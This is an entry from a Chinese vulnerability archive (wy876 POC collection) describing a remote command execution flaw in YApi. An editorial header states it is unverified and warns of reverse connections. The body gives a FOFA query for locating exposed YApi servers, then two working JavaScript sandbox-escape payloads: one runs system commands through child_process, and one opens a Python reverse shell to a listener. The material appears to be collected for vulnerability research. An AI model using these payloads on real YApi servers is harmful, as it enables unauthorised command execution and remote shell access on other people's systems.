---
source: "wy876 漏洞文库"
title: "Yapi存在远程命令执行漏洞"
product: "YApi"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Registered/logged-in account/project;versionunknown"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-72a222af5f1ecc358f3dd4d6"
entity_id: "ve-72a222af5f1ecc358f3dd4d6"
schema_version: "1"
---

# Yapi存在远程命令执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Registered/logged-in account/project;versionunknown
- 证据范围：Sameconstructorchain as52/53, different commands and secondexample;noresult

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- No advancedMock insertionpoint stated;lesscomplete workflow than52
- Java fence forJavaScript;the loopback callback requires an explanation of the execution environment
- No versions orfix;mergecommonmechanism preservevariant provenance

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
Yapi存在远程命令执行漏洞

# 二、影响版本
+ Yapi

# 三、资产测绘
+ fofa：`app="YApi"`
+ 特征


# 四、漏洞复现
注册账号登录


新建项目


添加接口


```java
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef").toString()
```


反弹shell

```java
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
Poc = process.mainModule.require("child_process").spawnSync(
  'python', ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",6699));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']
)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zwurnkdpoozs08fc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
